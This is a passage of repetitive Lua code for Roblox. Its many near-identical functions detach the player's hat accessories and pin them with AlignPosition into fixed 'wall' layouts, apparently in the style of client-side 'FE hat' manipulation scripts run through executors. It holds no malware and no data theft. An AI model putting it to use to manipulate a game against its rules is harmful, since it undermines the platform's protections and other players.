	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_10()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a10"
local HAT = "a10"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 8
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_11()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a11"
local HAT = "a11"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 4
Yval.Value = 8
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_12()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a12"
local HAT = "a12"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -4
Yval.Value = 8
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_13()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a13"
local HAT = "a13"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 8
Yval.Value = 8
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall2_14()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "a14"
local HAT = "a14"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = -8
Yval.Value = 8
Zval.Value = 10

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_1()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b1"
local HAT = "b1"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_2()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b2"
local HAT = "b2"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 0
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_3()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b3"
local HAT = "b3"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 0
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_4()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b4"
local HAT = "b4"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 0
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_5()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b5"
local HAT = "b5"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 0
Zval.Value = -8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_6()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b6"
local HAT = "b6"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_7()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b7"
local HAT = "b7"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = 4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_8()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b8"
local HAT = "b8"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = -4

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', part);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end


local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(part.Orientation.X + XvalO.Value, part.Orientation.Y + YvalO.Value, part.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie()
end

local function wall3_9()
e = math.random(-10000000,10000000)
print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("MeshPartAccessory")
fe.Name = "b9"
local HAT = "b9"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 10
Yval.Value = 4
Zval.Value = 8

XvalO.Value = 0
YvalO.Value = 90
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.SpecialMesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
